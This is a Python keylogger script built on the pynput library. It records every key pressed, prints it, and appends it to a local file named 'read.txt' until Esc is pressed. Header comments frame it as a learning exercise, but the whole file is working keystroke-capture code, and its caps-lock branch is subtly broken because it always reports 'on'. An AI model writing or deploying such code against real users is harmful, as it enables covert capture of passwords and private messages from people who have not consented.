# The keylogger is meant for understanding and learning purposes
# It will not execute in the background system
import pynput   
from pynput.keyboard import Key, Listener                              
                                                          
def press(key):                                                     # stores the data of the key pressed
    f=[]
    f.append(key)
    write_file(f)
    print(key, "pressed")

def release(key):                                                   # stores the data of the key released
    if key==Key.esc:                                                # check if the key is esc key or not, if so then the program will
        return False

def write_file(f):                                                   
    with open("read.txt","a") as file:                               # open the file
        for i in range(len(f)):
            alpha=str(f[i]).replace("'",'')                           
            if alpha.find("enter")>0:
                file.write("\n\n -->Enter \n\n")
            
            elif alpha.find(".space")>0:
                file.write("\n\n -->Space \n")

            elif alpha.find(".ctrl")>0:
                file.write("\n\n -->Ctrl \n")

            elif alpha.find(".backspace")>0:
                file.write("\b")

            elif alpha.find(".caps_lock")>0:
                count=0
                if count==0:
                    file.write("\n\n ->Capslock on \n")
                    count+=1
                elif count>0:
                    file.write("\n\n -->Caplock off \n")
                    count=0
            
            elif alpha.find(".shift")>0:
                file.write("")

            elif alpha.find(".esc")>0:
                file.write("\n\n -->Keylogger Terminated \n")

            else:
                file.write(alpha)

with Listener(on_press=press, on_release=release) as l:             # Listener will store the data of the keys that will be pressed on the keyboard by the user
    l.join()                                                        # We join the data we receive from release  and press functions 

    # 